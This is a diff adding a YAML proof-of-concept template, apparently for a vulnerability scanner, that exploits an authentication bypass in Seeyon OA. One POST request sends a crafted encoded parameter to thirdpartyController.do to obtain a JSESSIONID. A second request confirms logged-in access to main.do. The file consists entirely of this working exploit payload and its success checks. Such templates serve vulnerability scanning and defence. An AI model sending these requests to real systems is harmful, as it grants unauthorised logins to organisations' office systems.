@@ -1,0 +1,34 @@
+name: poc-yaml-seeyon-oa-arbitrary-auth
+binding: a8279e54-a155-457d-9674-c47ade717762
+manual: true
+detail:
+    author: Raiynin
+    links:
+        - https://blog.csdn.net/weixin_43227251/article/details/115616761
+    vulnerability:
+        id: CT-158498
+        level: critical
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /seeyon/thirdpartyController.do
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
+        expression: response.status == 200 && "set-cookie" in response.headers && response.headers["set-cookie"].contains("JSESSIONID=")
+        output:
+            search: '"JSESSIONID=(?P<session>.+?)".bsubmatch(response.body)'
+            session: search["session"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /seeyon/main.do
+            headers:
+                Cookie: JSESSIONID={{session}}
+        expression: response.status == 200 && response.body_string.contains("当前已登录了一个用户，同一窗口中不能登录多个用户")
+expression: r0() && r1()
